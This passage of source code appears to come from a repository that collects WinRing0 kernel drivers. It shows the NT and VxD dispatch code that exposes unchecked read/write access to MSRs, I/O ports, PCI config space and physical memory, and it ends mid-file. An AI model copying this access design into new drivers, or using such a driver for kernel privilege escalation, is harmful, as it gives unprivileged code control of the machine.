	if(nInBufferSize < offsetof(OLS_WRITE_MEMORY_INPUT, Data))
	{
		return STATUS_INVALID_PARAMETER;
	}

	param = (OLS_WRITE_MEMORY_INPUT *)lpInBuffer;

	size = param->UnitSize * param->Count;
	if (nInBufferSize < size + offsetof(OLS_WRITE_MEMORY_INPUT, Data))
	{
		return STATUS_INVALID_PARAMETER;
	}

	address.QuadPart = param->Address.QuadPart;

	maped = MmMapIoSpace(address, size, FALSE);

	error = FALSE;
	switch(param->UnitSize){
		case 1:
			WRITE_REGISTER_BUFFER_UCHAR(maped, 
										(UCHAR*)&param->Data, param->Count);
			break;
		case 2:
			WRITE_REGISTER_BUFFER_USHORT(maped,
										(USHORT*)&param->Data, param->Count);
			break;
		case 4:
			WRITE_REGISTER_BUFFER_ULONG(maped,
										(ULONG*)&param->Data, param->Count);
			break;
		default:
			error = TRUE;
			break;
	}

	MmUnmapIoSpace(maped, size);

	if(error)
	{
		return STATUS_INVALID_PARAMETER;
	}

	*lpBytesReturned = 0;

	return STATUS_SUCCESS;

#else

	*lpBytesReturned = 0;
	
	return STATUS_INVALID_PARAMETER;

#endif
}

```

`source/WormholeDrivers/WINRING0/dll/sys/OpenLibSys.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2008 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#include <ntddk.h>
#include <devioctl.h>
#include "../OlsIoctl.h"

//-----------------------------------------------------------------------------
//
// Device Name
//
//-----------------------------------------------------------------------------

#define NT_DEVICE_NAME	L"\\Device\\WinRing0_1_2_0"
#define DOS_DEVICE_NAME	L"\\DosDevices\\WinRing0_1_2_0"

//-----------------------------------------------------------------------------
//
// Function Prototypes
//
//-----------------------------------------------------------------------------

NTSTATUS	DriverEntry(
				IN PDRIVER_OBJECT DriverObject,
				IN PUNICODE_STRING RegistryPath
			);

NTSTATUS	OlsDispatch(
				IN PDEVICE_OBJECT pDO,
				IN PIRP pIrp
			);

VOID		Unload(
				IN PDRIVER_OBJECT DriverObject
			);

//-----------------------------------------------------------------------------
//
// Function Prototypes for Control Code
//
//-----------------------------------------------------------------------------

NTSTATUS	ReadMsr(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	WriteMsr(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);
			
NTSTATUS	ReadPmc(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	ReadIoPort(
				ULONG ioControlCode,
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	WriteIoPort(
				ULONG ioControlCode,
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	ReadPciConfig(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	WritePciConfig(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);
			
NTSTATUS	ReadMemory(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	WriteMemory(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);


//-----------------------------------------------------------------------------
//
// Support Function Prototypes
//
//-----------------------------------------------------------------------------

NTSTATUS pciConfigRead(ULONG pciAddress, ULONG offset, void *data, int length);
NTSTATUS pciConfigWrite(ULONG pciAddress, ULONG offset, void *data, int length);

```

`source/WormholeDrivers/WINRING0/dll/sys/OpenLibSys.rc`:

```rc
#include <windows.h>
#include <ntverp.h>

#define VER_FILETYPE                VFT_DRV
#define VER_FILESUBTYPE             VFT2_DRV_SYSTEM

#define VER_FILEDESCRIPTION_STR     "WinRing0"
#define VER_INTERNALNAME_STR        "WinRing0.sys"

/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1, 2, 0, 5
 PRODUCTVERSION 1, 2, 0, 5
 FILEFLAGSMASK 0x3fL
 FILEFLAGS 0x0L
 FILEOS 0x40004L
 FILETYPE 0x2L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "041104b0"
        BEGIN
            VALUE "Comments", "The modified BSD license\0"
            VALUE "CompanyName", "OpenLibSys.org\0"
            VALUE "FileDescription", "WinRing0\0"
            VALUE "FileVersion", "1.2.0.5\0"
            VALUE "InternalName", "WinRing0.sys\0"
            VALUE "LegalCopyright", "Copyright (C) 2007-2008 OpenLibSys.org. All rights reserved.\0"
            VALUE "OriginalFilename", "WinRing0.sys\0"
            VALUE "ProductName", "WinRing0\0"
            VALUE "ProductVersion", "1.2.0.5\0"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x411, 1200
    END
END

```

`source/WormholeDrivers/WINRING0/dll/sys/SOURCES`:

```
TARGETNAME=WinRing0
TARGETPATH=lib
TARGETTYPE=DRIVER

INCLUDES=..\

SOURCES=OpenLibSys.c OpenLibSys.rc

```

`source/WormholeDrivers/WINRING0/dll/vxd/Makefile`:

```
#-----------------------------------------------------------------------------
#     Author : hiyohiyo
#       Mail : hiyohiyo@crystalmark.info
#        Web : http://openlibsys.org/
#    License : The modified BSD license
#
#                                Copyright 2007 hiyohiyo, All rights reserved.
#-----------------------------------------------------------------------------
#
# How to build on Windows XP SP1 DDK (Win Me Free Build Environment)
#
# 0. Get Windows XP SP1 DDK from MSDN
# 1. Install Windows XP SP1 DDK with Win Me support
# 2. Open "Win Me Free Build Environment"
# 3. cd (WinRing0)\source\dll\vxd
# 4. nmake
#
# Compile Options
#_OPEN_LIB_SYS=

!ifdef _OPEN_LIB_SYS
VXDFILE = OpenLibSys.vxd
!else
VXDFILE = WinRing0.vxd
!endif

OBJDIR = bin
VXDWRAPSDIR = $(DDKROOT)\lib\win_me\

RC16 = $(DDKROOT)\bin\win_me\bin16\rc
ML   = $(DDKROOT)\bin\win_me\bin\ml
CL   = $(DDKROOT)\bin\x86\cl
LINK = $(DDKROOT)\bin\x86\link

!ifdef DEBUG
DDEBUG  =-DDEBLEVEL=1 -DDEBUG
!else
DDEBUG  =-DDEBLEVEL=0
!endif

CFLAGS  = -Zdp -Gs -c -DIS_32 $(DDEBUG)
LFLAGS  = -machine:i386 -debug:none kernel32.lib 
AFLAGS  = -coff -DBLD_COFF -DIS_32 -W2 -Zd -c -Cx -DMASM6

all: direxist $(OBJDIR)\OpenLS.vxd

direxist:
        if not exist $(OBJDIR)\nul    md $(OBJDIR)

$(OBJDIR)\OpenLS.res: OpenLS.rc
        $(RC16) -Fo$@ -r OpenLS.rc

$(OBJDIR)\OpenLS.obj: OpenLS.c
        $(CL) $(CFLAGS) -Fo$@ %s

$(OBJDIR)\ctrl.obj: ctrl.asm
        $(ML) $(AFLAGS) -Fo$@ %s

$(OBJDIR)\OpenLS.vxd: $(OBJDIR)\OpenLS.obj $(OBJDIR)\ctrl.obj\
                $(OBJDIR)\OpenLS.res OpenLS.def
        echo >NUL @<<OpenLS.crf
-MACHINE:i386 -DEBUG:NONE
-DEF:OpenLS.def -OUT:$(OBJDIR)\OpenLS.vxd -MAP:$(OBJDIR)\OpenLS.map
-VXD $(VXDWRAPSDIR)\vxdwraps.clb $(OBJDIR)\OpenLS.obj $(OBJDIR)\ctrl.obj 
<<
        $(LINK) @OpenLS.crf
        cd $(OBJDIR)
        mapsym OpenLS
        adrc2vxd OpenLS.vxd OpenLS.res
        copy /Y OpenLS.vxd ..\..\..\..\release\$(VXDFILE)
        cd ..
        
clean:
        -@if exist $(OBJDIR)\*.obj del $(OBJDIR)\*.obj
        -@if exist $(OBJDIR)\*.res del $(OBJDIR)\*.res
        -@if exist $(OBJDIR)\*.vxd del $(OBJDIR)\*.vxd
        -@if exist $(OBJDIR)\*.exp del $(OBJDIR)\*.exp
        -@if exist $(OBJDIR)\*.lib del $(OBJDIR)\*.lib
        -@if exist $(OBJDIR)\*.map del $(OBJDIR)\*.map
        -@if exist $(OBJDIR)\*.sym del $(OBJDIR)\*.sym
        -@if exist $(OBJDIR)\*.exe del $(OBJDIR)\*.exe
        -@if exist *.bak del *.bak
        -@if exist *.aps del *.aps

```

`source/WormholeDrivers/WINRING0/dll/vxd/OpenLS.c`:

```c
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2008 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#define WIN40COMPAT   1
#define WANTVXDWRAPS

#include <basedef.h>
#include <vmm.h>

#pragma VxD_LOCKED_CODE_SEG
#pragma VxD_LOCKED_DATA_SEG

#include <vwin32.h>
#include <vpicd.h>
#include <vxdwraps.h>
#include <winerror.h>
#include <stddef.h>

#include "OpenLS.h"
#include "../OlsIoctl.h"

//-----------------------------------------------------------------------------
//
// W32_DeviceIOControl
//
//-----------------------------------------------------------------------------

DWORD _stdcall W32_DeviceIOControl(DWORD	dwService,
                                   DWORD	dwDDB,
                                   DWORD	hDevice,
                                   LPDIOC	lpDIOCParms)
{
    DWORD dwRetVal = 0;
	int		count;
	int		index;

	switch(dwService)
	{
		case DIOC_OPEN:
			dwRetVal = NO_ERROR;
			break;
			case DIOC_CLOSEHANDLE:
			dwRetVal = CleanUp();
			break;
		case IOCTL_OLS_GET_DRIVER_VERSION:
			*(PULONG)lpDIOCParms->lpvOutBuffer = OLS_DRIVER_VERSION;
			*(PULONG)lpDIOCParms->lpcbBytesReturned = 4;
			dwRetVal = NO_ERROR;
			break;

		case IOCTL_OLS_READ_MSR:
			dwRetVal = ReadMsr(
				(void *)lpDIOCParms->lpvInBuffer,
				lpDIOCParms->cbInBuffer,
				(void *)lpDIOCParms->lpvOutBuffer,
				lpDIOCParms->cbOutBuffer,
				(void *)lpDIOCParms->lpcbBytesReturned
				);
			break;
		case IOCTL_OLS_WRITE_MSR:
			dwRetVal = WriteMsr(
				(void *)lpDIOCParms->lpvInBuffer,
				lpDIOCParms->cbInBuffer,
				(void *)lpDIOCParms->lpvOutBuffer,
				lpDIOCParms->cbOutBuffer,
				(void *)lpDIOCParms->lpcbBytesReturned
				);
			break;
		case IOCTL_OLS_READ_PMC:
			dwRetVal = ReadPmc(
				(void *)lpDIOCParms->lpvInBuffer,
				lpDIOCParms->cbInBuffer,
				(void *)lpDIOCParms->lpvOutBuffer,
				lpDIOCParms->cbOutBuffer,
				(void *)lpDIOCParms->lpcbBytesReturned
				);
			break;
		case IOCTL_OLS_HALT:
			__asm hlt;
			dwRetVal = NO_ERROR;
			break;

		case IOCTL_OLS_READ_IO_PORT:
		case IOCTL_OLS_READ_IO_PORT_BYTE:
		case IOCTL_OLS_READ_IO_PORT_WORD:
		case IOCTL_OLS_READ_IO_PORT_DWORD:
			dwRetVal = ReadIoPort(
				dwService,
				(void *)lpDIOCParms->lpvInBuffer,
				lpDIOCParms->cbInBuffer,
				(void *)lpDIOCParms->lpvOutBuffer,
				lpDIOCParms->cbOutBuffer,
				(void *)lpDIOCParms->lpcbBytesReturned
				);
			break;
		case IOCTL_OLS_WRITE_IO_PORT:
		case IOCTL_OLS_WRITE_IO_PORT_BYTE:
		case IOCTL_OLS_WRITE_IO_PORT_WORD:
		case IOCTL_OLS_WRITE_IO_PORT_DWORD:
			dwRetVal = WriteIoPort(
				dwService,
				(void *)lpDIOCParms->lpvInBuffer,
				lpDIOCParms->cbInBuffer,
				(void *)lpDIOCParms->lpvOutBuffer,
				lpDIOCParms->cbOutBuffer,
				(void *)lpDIOCParms->lpcbBytesReturned
				);
			break;

		case IOCTL_OLS_READ_PCI_CONFIG:
	        dwRetVal = ReadPciConfig(
				(void *)lpDIOCParms->lpvInBuffer,
				lpDIOCParms->cbInBuffer,
				(void *)lpDIOCParms->lpvOutBuffer,
				lpDIOCParms->cbOutBuffer,
				(void *)lpDIOCParms->lpcbBytesReturned
				);
			break;
		case IOCTL_OLS_WRITE_PCI_CONFIG:
	        dwRetVal = WritePciConfig(
				(void *)lpDIOCParms->lpvInBuffer,
				lpDIOCParms->cbInBuffer,
				(void *)lpDIOCParms->lpvOutBuffer,
				lpDIOCParms->cbOutBuffer,
				(void *)lpDIOCParms->lpcbBytesReturned
				);
			break;

		case IOCTL_OLS_READ_MEMORY:
	        dwRetVal = ReadMemory(
				(void *)lpDIOCParms->lpvInBuffer,
				lpDIOCParms->cbInBuffer,
				(void *)lpDIOCParms->lpvOutBuffer,
				lpDIOCParms->cbOutBuffer,
				(void *)lpDIOCParms->lpcbBytesReturned
				);
			break;
		case IOCTL_OLS_WRITE_MEMORY:
	        dwRetVal = WriteMemory(
				(void *)lpDIOCParms->lpvInBuffer,
				lpDIOCParms->cbInBuffer,
				(void *)lpDIOCParms->lpvOutBuffer,
				lpDIOCParms->cbOutBuffer,
				(void *)lpDIOCParms->lpcbBytesReturned
				);
			break;

		default:
	        dwRetVal = ERROR_NOT_SUPPORTED;
    }
    return dwRetVal;
}

//-----------------------------------------------------------------------------
//
// CPU
//
//-----------------------------------------------------------------------------

NTSTATUS
ReadMsr(void	*lpInBuffer, 
		ULONG	nInBufferSize, 
		void	*lpOutBuffer, 
		ULONG	nOutBufferSize, 
		ULONG	*lpBytesReturned)
{
	ULONG ulECX = *(ULONG*)lpInBuffer;
	ULONG ulEAX = 0;
	ULONG ulEDX = 0;

	_asm
	{
		mov ecx, ulECX
		rdmsr
		mov ulEAX, eax
		mov ulEDX, edx
	}
	memcpy((PULONG)lpOutBuffer, &ulEAX, 4);
	memcpy((PULONG)lpOutBuffer+1, &ulEDX, 4);

	*lpBytesReturned = 8;
    return STATUS_SUCCESS;
}


NTSTATUS
WriteMsr(	void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
	OLS_WRITE_MSR_INPUT* param = (OLS_WRITE_MSR_INPUT*)lpInBuffer;

	ULONG ulECX = param->Register;
	ULONG ulEAX = param->Value.LowPart;
	ULONG ulEDX = param->Value.HighPart;

	_asm
	{
		mov eax, ulEAX
		mov edx, ulEDX
		mov ecx, ulECX
		wrmsr
	}
	*lpBytesReturned = 0;
	return STATUS_SUCCESS;
}

NTSTATUS
ReadPmc(void	*lpInBuffer, 
		ULONG	nInBufferSize, 
		void	*lpOutBuffer, 
		ULONG	nOutBufferSize, 
		ULONG	*lpBytesReturned)
{
	ULONG ulECX = *(ULONG*)lpInBuffer;
	ULONG ulEAX = 0;
	ULONG ulEDX = 0;

	_asm
	{
		mov ecx, ulECX
		rdpmc
		mov ulEAX, eax
		mov ulEDX, edx
	}
	memcpy((PULONG)lpOutBuffer, &ulEAX, 4);
	memcpy((PULONG)lpOutBuffer+1, &ulEDX, 4);

	*lpBytesReturned = 8;
	
    return STATUS_SUCCESS;
}

//-----------------------------------------------------------------------------
//
// I/O Port
//
//-----------------------------------------------------------------------------

NTSTATUS
ReadIoPort( ULONG	ioControlCode, 
			void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void 	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
	ULONG nPort = *(ULONG*)lpInBuffer;

	switch(ioControlCode)
	{
		case IOCTL_OLS_READ_IO_PORT_BYTE:
			*(PUCHAR)lpOutBuffer = _inp((USHORT)nPort);
			break;
		case IOCTL_OLS_READ_IO_PORT_WORD:
			*(PUSHORT)lpOutBuffer = _inpw((USHORT)nPort);
			break;
		case IOCTL_OLS_READ_IO_PORT_DWORD:
			*(PULONG)lpOutBuffer = _inpd((USHORT)nPort);
			break;
		default:
			*lpBytesReturned = 0;
			return STATUS_INVALID_PARAMETER;
			break;
	}
	
	*lpBytesReturned = nInBufferSize;
	return STATUS_SUCCESS;
}

NTSTATUS
WriteIoPort(ULONG	ioControlCode, 
			void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
	ULONG nPort;
	OLS_WRITE_IO_PORT_INPUT* param;
	
	param = (OLS_WRITE_IO_PORT_INPUT*)lpInBuffer;
	nPort = param->PortNumber;

	switch(ioControlCode)
	{
		case IOCTL_OLS_WRITE_IO_PORT_BYTE:
			_outp((USHORT)nPort, param->CharData);
			break;
		case IOCTL_OLS_WRITE_IO_PORT_WORD:
			_outpw((USHORT)nPort, param->ShortData);
			break;
		case IOCTL_OLS_WRITE_IO_PORT_DWORD:
			_outpd((USHORT)nPort, param->LongData);
			break;
		default:
			return STATUS_INVALID_PARAMETER;
			break;
	}

	return STATUS_SUCCESS;
}

//-----------------------------------------------------------------------------
//
// PCI
//
//-----------------------------------------------------------------------------

DWORD
ReadPciConfig(	void	*lpInBuffer, 
				ULONG	nInBufferSize, 
				void	*lpOutBuffer, 
				ULONG	nOutBufferSize, 
				ULONG	*lpBytesReturned)
{
	OLS_READ_PCI_CONFIG_INPUT *param;
	DWORD status;

    if(nInBufferSize != sizeof(OLS_READ_PCI_CONFIG_INPUT))
    {
        return STATUS_INVALID_PARAMETER;
    }
	param	= (OLS_READ_PCI_CONFIG_INPUT *) lpInBuffer;

	status = pciConfigRead(param->PciAddress, param->PciOffset,
						lpOutBuffer, nOutBufferSize);

	if(status == STATUS_SUCCESS) {
	    *lpBytesReturned = nOutBufferSize;
    } else {
	    *lpBytesReturned = 0;
	}

    return status;
}

NTSTATUS
WritePciConfig(	void	*lpInBuffer, 
				ULONG	nInBufferSize, 
				void	*lpOutBuffer, 
				ULONG	nOutBufferSize, 
				ULONG	*lpBytesReturned)

{
	OLS_WRITE_PCI_CONFIG_INPUT *param;
	ULONG writeSize;
	NTSTATUS status;

	if(nInBufferSize < offsetof(OLS_WRITE_PCI_CONFIG_INPUT, Data))
	{
		return STATUS_INVALID_PARAMETER;
	}

	param = (OLS_WRITE_PCI_CONFIG_INPUT *)lpInBuffer;
	writeSize = nInBufferSize - offsetof(OLS_WRITE_PCI_CONFIG_INPUT, Data);
	
	*lpBytesReturned = 0;

	return pciConfigWrite(param->PciAddress, param->PciOffset,
							&param->Data, writeSize);
}

//-----------------------------------------------------------------------------
//
// Support Function
//
//-----------------------------------------------------------------------------

NTSTATUS
pciConfigRead(ULONG pciAddress, ULONG loffsetadd, char *data, int len)
{
	BYTE status, maxbusnumber;
	WORD offsetadd = loffsetadd;

	while(len > 0)
	{
		if(len >=4 && (offsetadd & 3) == 0)
		{
			DWORD d;
			__asm mov  ax, word ptr 0xb10a;  
			__asm mov  bx, word ptr pciAddress;
			__asm mov  di, offsetadd
			CallPciBios();
			__asm mov  d, ecx;
			__asm mov  status, ah;
			*(DWORD*)data = d;
			data += 4;
			len -= 4;
			offsetadd += 4;
		}
		else if(len >=2 && (offsetadd & 1) == 0)
		{
			WORD d;
			__asm mov  ax, word ptr 0xb109;  
			__asm mov  bx, word ptr pciAddress;
			__asm mov  di, offsetadd;
			CallPciBios();
			__asm mov  d, cx;
			__asm mov  status, ah;
			*(WORD*)data = d;
			data += 2;
			len -= 2;
			offsetadd += 2;
		}
		else
		{
			BYTE d;
			__asm mov  ax, word ptr 0xb108;  
			__asm mov  bx, word ptr pciAddress;
			__asm mov  di, offsetadd;
			CallPciBios();
			__asm mov  d, cl;
			__asm mov  status, ah;
			*(WORD*)data = d;
			data += 1;
			len -= 1;
			offsetadd += 1;
		}
		
		if(status != 0)
		{
			return STATUS_UNSUCCESSFUL;
		}
	}
	return STATUS_SUCCESS;
}

NTSTATUS
pciConfigWrite(ULONG pciAddress, ULONG loffsetadd, char *data, int len)
{
	BYTE status, maxbusnumber;
	WORD offsetadd = loffsetadd;

	while(len >0)
	{
		if(len >=4 && (offsetadd & 3) ==0)
		{
			DWORD d = *(DWORD*)data;
			__asm mov  ax, word ptr 0xb10d;  
			__asm mov  bx, word ptr pciAddress;
			__asm mov  di, offsetadd;
			__asm mov  ecx, d;
			CallPciBios();
			__asm mov status, ah
			data += 4;
			len -= 4;
			offsetadd += 4;
		}
		else if(len >=2 && (offsetadd & 1) == 0)
		{
			WORD d = *(DWORD*)data;
			__asm mov  ax, word ptr 0xb10c;  
			__asm mov  bx, word ptr pciAddress;
			__asm mov  di, offsetadd;
			__asm mov  cx, d;
			CallPciBios();
			__asm mov status, ah
			data += 2;
			len -= 2;
			offsetadd += 2;
		}
		else
		{
			BYTE d = *(DWORD*)data;
			__asm mov  ax, word ptr 0xb10b;  
			__asm mov  bx, word ptr pciAddress;
			__asm mov  di, offsetadd;
			__asm mov  cl, d ;
			CallPciBios();
			__asm mov status, ah
			data += 1;
			len -= 1;
			offsetadd += 1;
		}
		
		if(status != 0)
		{
			 return STATUS_UNSUCCESSFUL;
		}
	}
	return STATUS_SUCCESS;
}	

//-----------------------------------------------------------------------------
//
// Physical Memory
//
//-----------------------------------------------------------------------------

NTSTATUS
ReadMemory(	void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
	int i;
	ULONG	size;
	PVOID	maped;
	OLS_READ_MEMORY_INPUT *param;
	
	param = (OLS_READ_MEMORY_INPUT *)lpInBuffer;

	if(nInBufferSize != sizeof(OLS_READ_MEMORY_INPUT))
	{
		return STATUS_INVALID_PARAMETER;
	}

	size = param->UnitSize * param->Count;

	if(nOutBufferSize < size)
	{
		return STATUS_INVALID_PARAMETER;
	}

#ifndef _PHYSICAL_MEMORY_SUPPORT

	if(0x000C0000 > param->Address.LowPart 
	|| (param->Address.LowPart + size - 1) > 0x000FFFFF)
	{
		return STATUS_INVALID_PARAMETER;
	}

#endif

	maped = _MapPhysToLinear(param->Address.LowPart, size, 0);

	switch(param->UnitSize)
	{
		case 1:
			for(i = 0; i< param->Count; i++){
				 ((UCHAR*)lpOutBuffer)[i] = ((UCHAR*)maped)[i];
			}
			break;
		case 2:
			for(i = 0; i< param->Count; i++){
				((USHORT*)lpOutBuffer)[i] = ((USHORT*)maped)[i];
			}
			break;
		case 4:
			for(i = 0; i< param->Count; i++){
				((ULONG*)lpOutBuffer)[i] = ((ULONG*)maped)[i];
			}
			break;
		default:
			return STATUS_INVALID_PARAMETER;
			break;
	}

	*lpBytesReturned = nOutBufferSize;
	return STATUS_SUCCESS;
}

NTSTATUS
WriteMemory(void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
#ifdef _PHYSICAL_MEMORY_SUPPORT

	OLS_WRITE_MEMORY_INPUT *param;
	ULONG	size;
	PVOID	maped;
	int i;

	if(nInBufferSize < offsetof(OLS_WRITE_MEMORY_INPUT, Data))
	{
		return STATUS_INVALID_PARAMETER;
	}

	param = (OLS_WRITE_MEMORY_INPUT *)lpInBuffer;

	size = param->UnitSize * param->Count;
	if(nInBufferSize < size + offsetof(OLS_WRITE_MEMORY_INPUT, Data))
	{
		return STATUS_INVALID_PARAMETER;
	}

	maped = _MapPhysToLinear(param->Address.LowPart, size, 0);

	switch(param->UnitSize)
	{
		case 1:
			for(i = 0; i< param->Count; i++){
				 ((UCHAR*)maped)[i] = ((UCHAR*)param->Data)[i];
			}
			break;
		case 2:
			for(i = 0; i< param->Count; i++){
				((USHORT*)maped)[i] = ((USHORT*)param->Data)[i];
			}
			break;
		case 4:
			for(i = 0; i< param->Count; i++){
				((ULONG*)maped)[i] = ((ULONG*)param->Data)[i];
			}
			break;
		default:
			return STATUS_INVALID_PARAMETER;
			break;
	}

	*lpBytesReturned = 0;
	
	return STATUS_SUCCESS;

#else

	*lpBytesReturned = 0;
	
	return STATUS_INVALID_PARAMETER;

#endif

}

```

`source/WormholeDrivers/WINRING0/dll/vxd/OpenLS.def`:

```def
VXD OPENLS DYNAMIC

DESCRIPTION 'OPENLS VXD'

SEGMENTS
	_LTEXT		CLASS 'LCODE'   PRELOAD NONDISCARDABLE
	_LDATA		CLASS 'LCODE'   PRELOAD NONDISCARDABLE
EXPORTS
OPENLS_DDB @1

```

`source/WormholeDrivers/WINRING0/dll/vxd/OpenLS.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2008 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#include <devioctl.h>

//-----------------------------------------------------------------------------
//
// typedef/define
//
//-----------------------------------------------------------------------------

typedef DWORD NTSTATUS;
typedef BYTE  BOOLEAN;
typedef DIOCPARAMETERS *LPDIOC;

#define STATUS_SUCCESS                   ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL              ((NTSTATUS)0xC0000001L)
#define STATUS_INVALID_PARAMETER         ((NTSTATUS)0xC000000DL)

//-----------------------------------------------------------------------------
//
// Function Prototypes
//
//-----------------------------------------------------------------------------

DWORD _stdcall W32_DeviceIOControl(DWORD, DWORD, DWORD, LPDIOC);

DWORD _stdcall Dynamic_Init(void)
{
    return (VXD_SUCCESS);
}

DWORD _stdcall Dynamic_Exit(void)
{
    return (VXD_SUCCESS);
}

DWORD _stdcall CleanUp(void)
{
    return (VXD_SUCCESS);
}

extern void Exec_VxD_Int_rap(void);
#define CallPciBios() Exec_VxD_Int_rap()

//-----------------------------------------------------------------------------
//
// Function Prototypes for Control Code
//
//-----------------------------------------------------------------------------

NTSTATUS	ReadMsr(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	WriteMsr(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);
			
NTSTATUS	ReadPmc(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	ReadIoPort(
				ULONG ioControlCode,
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	WriteIoPort(
				ULONG ioControlCode,
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	ReadPciConfig(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	WritePciConfig(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	ReadMemory(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);

NTSTATUS	WriteMemory(
				void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned
			);


//-----------------------------------------------------------------------------
//
// Support Function Prototypes
//
//-----------------------------------------------------------------------------

NTSTATUS pciConfigRead(ULONG pciAddress, ULONG offset, void *data, int length);
NTSTATUS pciConfigWrite(ULONG pciAddress, ULONG offset, void *data, int length);

```

`source/WormholeDrivers/WINRING0/dll/vxd/OpenLS.rc`:

```rc
/////////////////////////////////////////////////////////////////////////////
//
// Version
//
VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1,2,0,5
 PRODUCTVERSION 1,2,0,5
 FILEFLAGSMASK 0x3fL
 FILEFLAGS 0x0L
 FILEOS 0x40004L
 FILETYPE 0x2L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "041104b0"
        BEGIN
            VALUE "Comments", "The modified BSD license\0"
            VALUE "CompanyName", "OpenLibSys.org\0"
            VALUE "FileDescription", "WinRing0.vxd\0"
            VALUE "FileVersion", "1.2.0.5\0"
            VALUE "InternalName", "WinRing0.vxd\0"
            VALUE "LegalCopyright", "Copyright (C) 2007-2008 OpenLibSys.org. All rights reserved.\0"
            VALUE "OriginalFilename", "WinRing0.vxd\0"
            VALUE "ProductName", "WinRing0\0"
            VALUE "ProductVersion", "1.2.0.5\0"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x411, 1200
    END
END

```

`source/WormholeDrivers/WINRING0/dll/vxd/ctrl.asm`:

```asm
;-----------------------------------------------------------------------------
;     Author : hiyohiyo
;       Mail : hiyohiyo@crystalmark.info
;        Web : http://openlibsys.org/
;    License : The modified BSD license
;
;                                Copyright 2007 hiyohiyo, All rights reserved.
;-----------------------------------------------------------------------------

WIN40COMPAT EQU 1
PAGE 58,132

    .386p
    .xlist
    include vmm.inc
    .list

;============================================================================
